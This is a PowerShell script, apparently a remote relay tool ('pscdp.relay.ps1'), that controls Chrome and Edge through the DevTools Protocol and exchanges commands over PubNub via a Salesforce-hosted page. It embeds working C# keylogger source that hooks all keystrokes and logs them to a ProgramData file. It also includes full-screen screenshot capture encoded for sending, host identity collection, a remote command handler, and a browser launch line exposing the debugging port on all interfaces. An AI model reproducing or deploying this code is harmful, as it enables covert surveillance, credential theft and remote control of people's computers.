Set-Location -LiteralPath (Split-Path -Parent -Path $MyInvocation.MyCommand.Definition)


$scriptGuid = '70d8ab8e-fdb2-4076-9fd8-ba81c1be92e3' # Use a unique GUID for each script
# $createdNew = $false
# $script:SingleInstanceEvent = New-Object System.Threading.EventWaitHandle $true, ([System.Threading.EventResetMode]::ManualReset), "Global\$scriptGuid", ([ref] $createdNew)

#if (-not $createdNew) {
    #Write-Error "An instance of this script is already running. Exiting."
    #exit 1
#}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# 20260920

# https://zenn.dev/mima_ita/articles/f1fc037e6eb134

# ungoogled chromium
# start chrome.exe --remote-debugging-port=9223 --profile-directory=Default --remote-allow-origins=* --suppress-message-center-popups  --noerrdialogs --disable-infobars --disable-notifications --no-first-run --no-default-browser-check --disable-signin-promo --hide-crash-restore-bubble --new-window https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub --remote-debugging-address=0.0.0.0 --remote-allow-origins=*
# https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub
# --headless=new
# --auto-open-devtools-for-tabs
# --remote-debugging-address=0.0.0.0
# --remote-allow-origins=* 
# --force-devtools-available
# frontend.appspot.com
# msedge requires --user-data-dir="%TEMP%\edge-debug-profile" # on tpl, not required (some pcs, not all)

# side benefit is that seems to keep ps script running
Add-Type -TypeDefinition '
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace PowerShell {
public class KeyLogger
{
    public static string filePath = @"C:\\ProgramData\\owdkeyboardlog.txt"; // Use the full path
    public static StringBuilder sb = new StringBuilder("", 80);
    
    private static IntPtr _hookID = IntPtr.Zero;
    private static LowLevelKeyboardProc _proc = HookCallback;

    // Delegate for the hook procedure
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    // Required for the message loop
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public int ptX; public int ptY; }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        int vkCode = -1;

        if (nCode >= 0 && wParam == (IntPtr)0x0100) // WM_KEYDOWN
        {
            vkCode = Marshal.ReadInt32(lParam);
            // Console.WriteLine($"Key Pressed: {(System.Windows.Forms.Keys)vkCode}"); // Requires System.Windows.Forms
            sb.Append("[");
            sb.Append(String.Format("{0}", (System.Windows.Forms.Keys) vkCode));
            sb.Append("]");
        }

        if ( ( ( (System.Windows.Forms.Keys) vkCode ) == System.Windows.Forms.Keys.Enter ) || ( sb.Length >= 15 ) ) {
            string result = sb.ToString();
            System.IO.File.AppendAllText(filePath, result + Environment.NewLine);
            sb.Clear();
            sb.Length = 0;
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    public static void Main()
    {
        _hookID = SetWindowsHookEx(13, _proc, GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName), 0);

        // Message loop to keep the hook active
        MSG msg;
        while (GetMessage(out msg, IntPtr.Zero, 0, 0) > 0) { }

        UnhookWindowsHookEx(_hookID);
    }
}
}
' -ReferencedAssemblies System.Windows.Forms

function Get-Identity {
    $ScriptName = "pscdp.relay.ps1"

    $ComputerName = $env:COMPUTERNAME
    
    $UserName = $env:USERNAME
    
    return "$ScriptName|$ComputerName|$UserName|PowerShell-$PSVersionTable"
}

$script:identitykvpstr = Get-Identity | ConvertTo-Json

$script:logger_logmsg_i = 0
function Log-Msg {
    param([string]$Msg)

    $caller = (Get-PSCallStack)[0].FunctionName

    if ( (Get-PSCallStack).length -gt 1 ) {
        $caller = (Get-PSCallStack)[1].FunctionName
    }

    $script:logger_logmsg_i++

    Write-Host "$caller|$script:logger_logmsg_i|$Msg"
}

function Get-Timestamp {
    $ret = Get-Date -Format "HH:mm:ss.fff"
    return $ret
}

function Take-Screenshot() {
    $memoryStream = New-Object System.IO.MemoryStream

    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen

    $name = (( $screen.DeviceName -replace '\\', '' ) -replace '\.', '')

    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top

    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)

    $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        
    $graphic.Dispose()
    $bitmap.Dispose()

    $base64String = [Convert]::ToBase64String($memoryStream.ToArray())

    return $base64String
}

function Get-FrontendUrls() {
    return $script:clientws.targets
}

function Get-KeyboardLog() {
    $text = Get-Content -Path "C:\ProgramData\owd\owdkeyboardlog.txt" -Raw

    return $text
}

$script:msedge_debugport = 9222
$script:chrome_debugport = 9223


class PSCDPCommand {
    [string]$name
    [int32]$id
    [string]$method
    [hashtable]$params
    [object]$response
    [string]$sessionId
    [scriptblock]$callback
    [bool]$isinvoked = $false
    [bool]$addsessionid = $false
    [bool]$iserror = $false

    [bool]HasCallback() {
        return ( $null -ne $this.callback )
    }

    [hashtable] GetDict() {

        if ( [string]::IsNullOrWhiteSpace($this.method) ) {
            throw 'method is missing'
        }

        $obj = @{
            id=$this.id
            method=$this.method
        }

        if ( $null -ne $this.params ) {
            $obj.Add('params', $this.params)
        }

        if ( ! [string]::IsNullOrWhiteSpace($this.sessionId) ) {
            $obj.Add('sessionId', $this.sessionId)
        }

        return $obj
    }

    [void] SetID([int32]$id) {
        $this.id = $id
    }

    [void] SetSessionID([string]$sessionId) {
        $this.sessionId = $sessionId
    }

    [void] SetResponse([object]$response) {
        $this.response = $response
    }

    [string] ToJSON() {
        $obj = $this.GetDict() 
        $jsonstr = $obj | ConvertTo-Json -Depth 10 -Compress
        return $jsonstr
    }
}

class PSCDPResponse {

}

class PSCDPTarget {
    [string]$title
    [string]$url
    [string]$id
    [string]$sessionId
    [string]$type
    [string]$description

    static [PSCDPTarget] FindTarget([System.Collections.Generic.List[PSCDPTarget]]$targets, [string]$id=$null, [string]$title=$null, [string]$url=$null) {

        foreach ($target in $targets) {
            if ( $target.url -eq $url ) {
                return $target
            }
        }
        
        return $null
    }

}

# TODO check when exception result is returned
$script:SendPBMessage_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )
    
    Log-Msg "pass" 

}

$script:runtime_evaluate_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    Log-Msg "pass"
}

$script:runtime_addBinding_callback = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cdpobj.addbinding_ok = $true

    $params = @{
        expression="(function() { console.log(`"Debug info "+ $(Get-Timestamp) + " `"); return " + $(Get-Random -Minimum 1 -Maximum 100) + "; })()"
        returnByValue=$true
    }

    $this.sendQueue.Add( @{ method="Runtime.evaluate"; params=$params; addsessionid=$true; callback=$script:runtime_evaluate_callback } )
}

$script:init_sessionid_action = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $cdpobj.sessionId = $Response['result'].sessionId

    $this.sendQueue.Add( @{ method="Runtime.addBinding"; params=@{ name="onPubNubEvent" }; addsessionid=$true; callback=$script:runtime_addBinding_callback } )
}

$script:get_targets_action = {
    param(
        [object]$Response, [PSCDP]$cdpobj
    )

    $url = 'orgfarm-bd12a2161b-dev-ed'

    # $_.title.Contains("Yahoo!")
    $targetInfo = $Response.result.targetInfos | Where-Object { $_.type -eq "page" -and ( $_.url.Contains($url) ) } | Select-Object -First 1

    if ( $null -eq $targetInfo ) {
        return $null
    }

    $params = @{ 
        targetId=$targetInfo.targetId 
        flatten=$true 
    }

    $cdpobj.sendQueue.Add( @{ method="Target.attachToTarget"; params=$params; callback=$init_sessionid_action } )

}

# TODO implement incmming commands
function Process-PubNubEvent {

    param([string]$Message)

    try {
        $payload = $Message | ConvertFrom-Json # should have cmdid, etc.

        if ( $payload.message.source -eq "pscdp.relay.ps1" ) {
            return
        }
    
        
    } catch {

    }

    $isbuiltincmd = $false
    $cmd = $null

    try {
        if ( $payload.message.builtincmd -eq "GetFrontEndrls" ) {
            $isbuiltincmd = $true
            $cmd = $payload.message
        }
    } catch {

    }

    if ( ! $isbuiltincmd -and $null -ne $cmd ) {
        return
    }

    $resultout = @{
        builtincmd=$cmd.builtincmd
        source="pscdp.relay.ps1"
        destination=$cmd.source
        cmdid=$cmd.cmdid
        resultid=$(Get-Random -Minimum 10000000 -Maximum 99999999)
        ts=$(Get-Timestamp)
        result=$null
    }

    if ( $cmd.builtincmd -eq "GetFrontendUrls" ) {
        $result = Get-FrontendUrls
    }

    $resultout['result'] = $result

    Log-Msg $payload

    # GetScreenshot --> send back image as base64 string

    # GetFrontendUrls --> send back 
    #  $script:clientws.targets

    <#
    $cmd = @{
        builtincmd="GetFrontendUrls"
        source="pscdp.relay.ps1"
        destination="BROADCAST"
        ts=$(Get-Timestamp)
        cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
    }
    #>
    $result = Get-FrontendUrls

    # --> write response back to pubnub 
    # $cdpobj.SendPBMessage("test 41234 $(Get-Timestamp)") 
    # $script:pubnubws.sendQueue.Add( @{ method="Page.enable"; params=@{ enabled = $true } } )

    # HTTP request
    # issue Invoke-WebRequest to client frontend url with path
    # https://chrome-devtools-frontend.appspot.com/serve_rev/@199a3a541d76237379e353b348e64045584db057/inspector.html?ws=localhost:9223/devtools/page/AF0A1A7626286253F21401C651C983B0
    # retrieve HTTP with headers, body, etc. and forward to pubnub

}

class PSCDP {

    $debugport = 9223
    $wsUri = $null
    $websocket = $null
    $targets = $null

    $sendQueue = [System.Collections.Concurrent.BlockingCollection[object]]::new()
    $responses = [System.Collections.Generic.List[object]]::new()
    $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
    $results = [System.Collections.Generic.List[object]]::new()
    $errors = [System.Collections.Generic.List[object]]::new() 
    $pubnubmsgs = [System.Collections.Generic.List[object]]::new()

    [int32]$messageId = 1
    $receiveNew = $true
    $byteArray = $true
    $segment = $true
    $task = $true
    $bufferSize = 4096
    $memoryStream
    $totalbytecount = 0
    $result = $null
    $addbinding_ok = $false
    $executionContextId = $null

    # TODO need to track current active target, sessionId should be extracted from this active target
    $activeTarge = $null # [PSCDPTarget]
    $sessionId = $null
    $initpage = $null

    $logconsolemsg = $false

    [void] CheckSocket() {

        if ( $this.IsSocketHealthy() ) {
            return
        }

        if ( $null -eq $this.webSocket ) {
            throw "websocket is null"
        }

        if ( ! $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) {
            throw 'websocket is not open'
        }
        
    }

    [bool] IsSocketHealthy() {
        if ( ( ! $null -eq $this.webSocket ) -and ( $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) ) {
            return $true
        }

        return $false
    }

    [void] init() {
        $this.memoryStream = New-Object System.IO.MemoryStream
        $this.debugport = 9223
    }

    PSCDP() {
        $this.init()
    }

    PSCDP($debugport) {
        $this.init()
        $this.debugport = $debugport
    }

    PSCDP($debugport, $initpage) {
        $this.init()
        $this.debugport = $debugport
        $this.initpage = $initpage
    }

    [string] GetWSUrI() {

        if (! [string]::IsNullOrWhiteSpace($this.wsUri)) {
            return $this.wsUri
        }

        $this.targets = $this.GetTargets()

        # if init page is set, filter using init page
        if ( ! [string]::IsNullOrEmpty($this.initpage) ) {
            $this.wsUri = ($this.targets | Where-Object { $_.url -eq $this.initpage } | Select-Object -First 1).webSocketDebuggerUrl
        } else {
            $this.wsUri = ($this.targets | Select-Object -First 1).webSocketDebuggerUrl
        }
        
        return $this.wsUri
    }

    # TODO refactor to PSCDPTarget
    [object] GetTargets() {
        try {
            $this.targets = Invoke-RestMethod -Uri "http://localhost:$($this.debugport)/json" -ErrorAction Stop
        } catch [System.Net.WebException] {
            Log-Msg "[N3U8]: $($_.Exception.Message)"
            return $null
        }        


        # $targets | Select-Object title, id, webSocketDebuggerUrl
        $this.targets = $this.targets | Where-Object { $_.type -eq "page" }

        return $this.targets
    }

    [void] ConnectCdp() {
        Log-Msg "new CDP connection at $($this.debugport)"

        $this.wsUri = $this.GetWSURI()

        if ( [string]::IsNullOrWhiteSpace($this.wsUri) ) {
            throw "wsUri is empty"
        }

        if ( $null -eq $this.websocket ) {
            Log-Msg "connecting to cdp on [$($this.wsUri)]"
        } else {
            Log-Msg "reconnecting to cdp on [$($this.wsUri)]"
        }
    
        $this.websocket = New-Object System.Net.WebSockets.ClientWebSocket
        $connectTask = $this.websocket.ConnectAsync($this.wsUri, [System.Threading.CancellationToken]::None)

        if ( $null -eq $this.websocket) {
            throw "could not connect"
        }

        $connectTask.Wait()
        
        Log-Msg "Connected! Current WebSocketState: $($this.websocket.State)" -ForegroundColor Green
    }

    [PSCDPCommand] GetCommandByID([string]$id) {
        $cmd = $this.commands | Where-Object { $_.id -eq $id } | Select-Object -First 1
        return $cmd
    }

    [PSCDPCommand] GetCommand([string]$name) {
        $cmd = $this.commands | Where-Object { $_.name -eq $name } | Select-Object -First 1
        return $cmd
    }

    [object] GetResultByID($id) {
        $cmd = $this.GetCommandByID($id)

        if ( $null -eq $cmd ) {
            return $null
        }

        return $this.GetResultByCmd($cmd)
    }

    [object] GetResultByCmd([PSCDPCommand]$cmd) { #TODO refactor to return PSCDPResponse object
        try {
            $id = $cmd.id

            if ( ( $null -eq $this.results ) -or ( $this.results.Count -le 0 ) ) {
                return $null
            }

            $arr = $this.results.ToArray()
            for ($i = 0; $i -lt $arr.Count; $i++) {
                $t = $arr[$i]

                if ( ($t.id).ToString() -eq ($id).ToString() ) {
                    return $t
                }

            }
            
            return $null
        } catch {
            Write-Error $_.Exception.Message
        }

        return $null
    }

    [object] GetResult([string]$cmdname) { #TODO refactor to return PSCDPResponse object

        $cmd = $this.GetCommand($cmdname)

        if ( $null -eq $cmd ) {
            return $null
        }

        return $this.GetResultByCmd($cmd)
    }

    [PSCDPCommand] SendCdpCommand([hashtable]$cmd) {
        if ( $cmd.addsessionid ) {
            $cmd.sessionId = $this.sessionId
        }

        return $this.SendCdpCommand($cmd,$this.sessionId)
    }

    [PSCDPCommand] SendCdpCommand([hashtable]$cmd, [string]$sessionID) {
        
        if ( $null -eq $this.websocket ) {
            throw "websocket is null"
        }

        if ($this.websocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "Cannot send command. WebSocket is not Open (State: $($this.websocket.State))"
        }

        $id = $this.messageId++

        $cmd.Add('id', $id)

        if (! [string]::IsNullOrEmpty($sessionID)) {
            $cmd['sessionId'] = $sessionID
        }
        
        $obj = [PSCDPCommand]$cmd
        
        $this.commands.Add($obj)

        $payload = $obj.ToJson() 
    
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
        $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
    
        if (! $this.websocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            throw "web socket is not open"
        }
    
        try {
            $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
            
            if ( $null -ne $sendTask ) {
                $tresult = $sendTask.GetAwaiter().GetResult()
            } else {
                throw "fatal error -- task is null"
            }
        } catch {
            Write-Error "[J7E3]: $($_.Exception.Message)"
            return $null
        } 
    
        $method = ""
        if ( $cmd.ContainsKey('method') ) {
            $method = $cmd['method']
        }

        Log-Msg "Sent Command [$id]: $method" -ForegroundColor Cyan
    
        return $obj
    }
    
    [void] InitReceive() {
        if ( ! $this.receiveNew ) {
            Log-Msg "... existing receive in progress"
            return
        }

        Log-Msg "...kicking off new receive"
        $this.byteArray = [byte[]]::new($this.bufferSize)
        $this.segment = [ArraySegment[byte]]::new($this.byteArray)                

        $this.task = $this.webSocket.ReceiveAsync($this.segment, [System.Threading.CancellationToken]::None)
        $this.receiveNew = $false
    }

    [void] ReadMessage() {
        if ( ! $this.task.IsCompleted ) {
            Log-Msg "... receive not completed -- skipping"
            return
        }

        Log-Msg "...waiting for result"

        $this.result = $this.task.GetAwaiter().GetResult()
        # TODO: throws error -- The remote party closed the WebSocket connection without completing the close handshake.

        $this.receiveNew = $true

        if ($this.result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
            throw "WebSocket connection closed by the remote host."
        }
        elseif ($this.task.IsFaulted) {
            throw "[X2H2] Receive failed: $($this.task.Exception.InnerException.Message)"
        }
        elseif ($this.task.IsCanceled) {
            throw "[A2O9] Receive operation was cancelled."
        }
        elseif ( ! ( $this.task.Status -eq [System.Threading.Tasks.TaskStatus]::RanToCompletion ) ) {
            throw "task Status != RanToCompletion"
        } else {

            $bytesReceived = $this.result.Count
            
            Log-Msg "...received $bytesReceived bytes"
            
            if ($bytesReceived -gt 0) {
                $this.memoryStream.Write($this.byteArray, 0, $bytesReceived)

                $this.totalbytecount = $this.totalbytecount + $bytesReceived
                Log-Msg "...total bytes $($this.totalbytecount)"
            }

        }
    }

    [bool] IsMessageError([hashtable]$msg) {

        $iserror = $false

        try {
            if ( ! $msg.ContainsKey('result') ) {
                throw ""
            }
    
            if ( $msg.result.result.subtype -eq "error" ) {
                $iserror = $true
                throw ""
            }
    
            if ( ! [string]::IsNullOrEmpty($msg.result.exceptionDetails.exceptionId) ) {
                $iserror = $true
                throw ""
            }
    
    
        } catch {
            
        }
    
        return $iserror
    }

    [void] EndMessage() {
        if ( ! $this.result.EndOfMessage) {
            Log-Msg "... message is not complete -- skipping"
            return
        }

        $completeBytes = $this.memoryStream.ToArray()

        Log-Msg "...message is complete"

        if ( $completeBytes.count -le 0 ) {
            Log-Msg "empty message -- skipping"
            return
        }

        $json = [System.Text.Encoding]::UTF8.GetString($completeBytes)
        $this.memoryStream = New-Object System.IO.MemoryStream
        $this.totalbytecount = 0

        if ( [string]::IsNullOrWhiteSpace($json) ) {
            return
        }

        try {
            $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResponse
            
            $iserror = $false # TODO check if msg is an error and add to errors list
            $isresult = $false
            $newtarget = $false
            $bindingCalled = $false
            $consoleAPICalled = $false
            $executionContextCreated = $false

            $msght = @{}
            $msg.psobject.Properties | ForEach-Object {
                
                if ( $_.Name -eq "result" ) {
                    $isresult = $true
                } elseif ( $_.Name -eq "method" )  {
                    if ( $_.Value -eq 'Target.attachedToTarget' ) {
                        $newtarget = $true
                    } elseif ( $_.Value -eq 'Runtime.bindingCalled' ) {
                        $bindingCalled = $true
                    } elseif ( $_.Value -eq 'Runtime.consoleAPICalled' ) {
                        $consoleAPICalled = $true
                    } elseif ( $_.Value -eq 'Runtime.executionContextCreated' ) {
                        $executionContextCreated = $true
                    }
                } elseif ( $_.Name -eq "error" ) {
                    $iserror = $true
                }

                $msght[$_.Name] = $_.Value
            }

            $this.responses.Add($msght)

            # check if new target attached, get sessionid
            if ( $newtarget ) {
                if ( $msght['params'].Value.targetInfo.type -eq "page" ) {
                    $this.sessionId = $msght['params']['sessionId']
                }
            }

            $iserror = $this.IsMessageError($msght)
            if ( $iserror ) {
                $this.errors.Add($msght)
            }

            # check if msg is a response to an issued cmd
            if ( $isresult ) {
                $cmd = $this.GetCommandByID($msg.id) # $this.commands | Where-Object { $id -eq $msg.result.id } | Select-Object -First 1 
            
                if ( $null -ne $cmd ) {
                    $cmd.response = $msght
                    $cmd.iserror = $iserror
                }

                $msght.Add('cmd', $cmd)

                $this.results.Add($msght)
            }

            # TODO needs error checking to ensure objects have properties being accessed
            if ( $bindingCalled ) {
                if ( $msght['params'].name -eq "onPubNubEvent" ) { # $msght['params'].payload
                    Log-Msg "processing incomming PubNub event"
                    $this.pubnubmsgs.Add($msght)
                    $payload = $msght['params'].payload # works - able to receive pubnub messages from browser
                    Process-PubNubEvent -Message $payload
                    # name = onPubNubEvent
                    # payload = "{"type":"message 1234","message":{"msgstr":"test 41234 10:11:46.449"}}"
                } # $pubnubmsg
            }

            if ( $consoleAPICalled ) {
                $msghtstr = $msght.GetEnumerator() | ForEach-Object { "{0}={1}" -f $_.Key, $_.Value } | Out-String
                
                if ( $this.logconsolemsg ) {
                    Log-Msg $msghtstr 
                    Log-Msg ($msght['params'].args | Out-String)
                }

            }

            # TODO verify $msg has params, context, etc.
            if ( $executionContextCreated ) {
                $url = $msg.params.context.origin
                if ( ! [string]::IsNullOrWhiteSpace($url) -and $url.Contains("orgfarm-bd12a2161b-dev-ed") ) {
                    $this.executionContextId = $msg.params.context.id
                }
            }

        } catch {
            Write-Error "ConvertFrom-Json Exception: $($_.Exception.Message)"
        }
    
    }
    
    [void] NextCmd() {

        if ( $this.sendQueue.IsCompleted -or ( $this.sendQueue.Count -le 0 ) ) {
            return
        }

        Log-Msg ( "sending cmd -- cmds count: " + $this.sendQueue.Count )

        $cmd = $this.sendQueue.Take()
        $cmd = $this.SendCdpCommand($cmd)
    }

    [void] ExecCallbacks() {

        for ( $i = 0; $i -lt $this.commands.Count; $i++) {
            $cmd = $this.commands[$i]

            if ( $cmd.HasCallback() -and ( ! $cmd.isinvoked ) -and ( $null -ne $cmd.response) ) {
                $cmd.callback.Invoke($cmd.response,$this)
                $cmd.isinvoked = $true
            }

        }

    }

    <#
    {
    "method": "Runtime.bindingCalled",
    "params": {
        "name": "pubnub_binding",
        "payload": "{\"channel\":\"chat-room\",\"message\":\"Hello from the webpage!\"}",
        "executionContextId": 1
    }
    }
    #>

    [void] LoadQueue() {
        $this.sendQueue.Add( @{ method="Page.enable"; params=@{ enabled = $true } } )
        $this.sendQueue.Add( @{ method="Page.setLifecycleEventsEnabled"; params=@{ enabled = $true } } )
        $this.sendQueue.Add( @{ method="DOM.enable"; params=@{ enabled = $true } } )
        $this.sendQueue.Add( @{ method="Runtime.enable"; params=@{ enabled = $true } } )    # generates Runtime.executionContextCreated
        $this.sendQueue.Add( @{ method="Overlay.enable"; params=@{ enabled = $true } } )
    
        $params = @{
            autoAttach = $true
            waitForDebuggerOnStart = $false
            flatten = $true
        }
        $this.sendQueue.Add( @{ method="Target.setAutoAttach"; params=$params } )
    
        <#
        if ( [string]::IsNullOrWhiteSpace($this.initpage) ) {

            $params = @{
                url = $this.initpage
                newWindow = $false
                # browserContextId = $null
                # "width": 10,
                # "height": 10,
                # // "left": 2000,
                # "top": 2000
                # #"windowState": "minimized"
                # #"hidden": True --> has problems/issues
            }

            $this.sendQueue.Add( @{ name="navigate_init_page"; method="Target.createTarget"; params=$params } )
        }
        #>

        $this.sendQueue.Add( @{ method="Target.getTargets"; callback=$script:get_targets_action })

    }


    [void] SendPBMessage([hashtable]$cmd) {

        if ( [string]::IsNullOrEmpty($this.executionContextId) ) {
            throw 'executionContextId is empty'
        }

        $json = $cmd | ConvertTo-Json # TODO wrap in try catch and report error as needed
        $tbytes = [System.Text.Encoding]::UTF8.GetBytes($json)
        $jsonb = "`"" + [System.Convert]::ToBase64String($tbytes) + "`""

        $params = @{
            functionDeclaration="function f() { let tpayload=JSON.parse(atob($jsonb)); sendMessage(tpayload); }"
            executionContextId=$this.executionContextId
            returnByValue=$true
        }

        $this.sendQueue.Add( @{ method="Runtime.callFunctionOn"; params=$params; addsessionid=$true; callback=$script:SendPBMessage_callback } )
    }

    [void] Broadcast() {
        if ( ! ( $this.addbinding_ok -and ( ! [string]::IsNullOrEmpty($this.executionContextId) ) ) ) {
            return
        }

        $cmd = @{
            builtincmd="SendBroadcast"
            source="pscdp.relay.ps1"
            destination="BROADCAST"
            ts=$(Get-Timestamp)
            cmdid=$(Get-Random -Minimum 10000000 -Maximum 100000000)
        }

        $this.SendPBMessage($cmd) # TODO change this to send a hashtable, with builtincmd: SendBroadcast, etc.

    }

    [void] LogState() {
        try {
            Log-Msg "system state -- sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count) results: $($this.results.Count) errors: $($this.errors.Count) pubnub messages: $($this.pubnubmsgs.Count)"
        } catch {
            Log-Msg "could not produce system overview message"
        }        
    }
}

$script:clientws = [PSCDP]::new($script:chrome_debugport)
$script:clientws.ConnectCdp()

$script:pubnubws = [PSCDP]::new($script:msedge_debugport, "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub")
$script:pubnubws.LoadQueue()
$script:pubnubws.ConnectCdp()

#$script:pubnubws = [PSCDP]::new()
#$script:pubnubws.ConnectCdp()

$keyboardlogger = {
    try {
        [PowerShell.KeyLogger]::Main()
    } finally {
        if ($script:SingleInstanceEvent) {
            $script:SingleInstanceEvent.Dispose()
        }
    }
}

# $ps = [powershell]::Create().AddScript($keyboardlogger)
# $asyncResult = $ps.BeginInvoke()

$d = 200
$n = 10
$i = 0
while ( $true ) {

    Log-Msg "new iteration"

    $script:pubnubws.LogState()
    $script:pubnubws.CheckSocket() # report basic statistics: number of messages sent, received, errors, responses, results, etc.

    $script:pubnubws.InitReceive()
    $script:pubnubws.ReadMessage()
    $script:pubnubws.EndMessage()

    $script:pubnubws.ExecCallbacks()
    $script:pubnubws.NextCmd()

    if ( $i -ge $n ) {
        $script:pubnubws.Broadcast()
        $i=0
    }

    # ---
    # $script:clientws.LogState()
    $script:clientws.CheckSocket()

    $script:clientws.InitReceive()
    $script:clientws.ReadMessage()
    $script:clientws.EndMessage()

    $script:clientws.ExecCallbacks()
    $script:clientws.NextCmd()

    Log-Msg "...sleeping"

    Start-Sleep -Milliseconds 200
    $i++
}

exit

# http://localhost:9223/json --> list of targets, filter on type: page
# devtoolsFrontendUrl
# send back to host

<#
if ( $null -eq $readtask ) {
    $readbuf = [byte[]]::new($bufferSize)
    $readtask = $reader.ReadAsync($readbuf, 0, $bufferSize, [System.Threading.CancellationToken]::None)
}

if ( $null -ne $readtask -and $readtask.IsCompleted ) {
    $bytesRead = $readTask.GetAwaiter().GetResult()
    $message = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
    $hashobj = ConvertFrom-Json -InputObject $message -AsHashtable
    $sendQueue.Add($hashobj)
    $readtask = $null
}
#>